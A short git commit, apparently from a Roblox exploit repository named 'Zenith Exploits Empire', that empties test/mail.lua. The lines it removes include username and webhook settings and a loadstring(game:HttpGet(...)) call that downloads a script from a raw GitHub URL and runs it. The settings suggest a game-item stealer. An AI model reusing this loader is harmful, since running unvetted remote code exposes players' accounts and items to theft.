3544e84e680c2cb61127d0f6cbdc54c853ab44ae
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 08:27:00 +0200

    Updated test/mail.lua via Script Updater

--- test/mail.lua
+++ test/mail.lua
@@ -1,5 +1,1 @@
-Username = "mail"
-Username2 = "mail"
-Webhook = "mail"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/main/RAW%20-%20pets%20go"))()
+hiii guys
